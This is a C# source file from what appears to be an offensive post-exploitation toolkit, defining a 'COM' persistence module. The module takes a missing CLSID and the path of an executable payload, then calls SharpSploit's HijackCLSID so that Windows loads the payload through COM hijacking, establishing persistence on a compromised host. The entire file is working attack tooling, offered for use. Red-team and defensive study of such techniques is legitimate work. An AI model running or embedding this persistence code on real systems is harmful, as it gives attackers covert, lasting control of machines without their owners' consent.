using ArgParseCS;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.Persistence
{
    internal class COM : ICommand, ICommandMarker
    {
        public string Name => "COM";
        public string Description => "Abusing the Microsoft Component Object Model to establish peristence";
        private ArgParse argParse;
        private void DefineParams()
        {
            argParse = new ArgParse {
                new OptionSet("Autorun") {
                    new Option("-c", "--CLSID", "Missing CLSID to abuse.", true, true),
                    new Option("-e", "--ExecutablePath", "Path to the executable payload.", true, true),
                },
            };
        }
        public void Execute(string[] args)
        {
            DefineParams();
            if (args.Length == 0)
            {
                argParse.Usage();
                return;
            }
            try
            {
                argParse.Parse(args);
                OptionSet activeOptionSet = argParse.GetActiveOptionSet();

                Option option = activeOptionSet.GetOption("-c");
                string CLSID = option.ParamValue;
                option = activeOptionSet.GetOption("-e");
                string ExecutablePath = option.ParamValue;
                if (string.IsNullOrEmpty(CLSID)||string.IsNullOrEmpty(ExecutablePath))
                {
                    argParse.Usage();
                    return;
                }
                
                
                if (SharpSploit.Persistence.COM.HijackCLSID(CLSID,ExecutablePath))
                {
                    Console.WriteLine("\t[*] Success");
                }
            }
            catch (Exception exception)
            {
                // User control the exception
                System.Console.WriteLine("exception: " + exception.Message);
            }
        }
    }
}
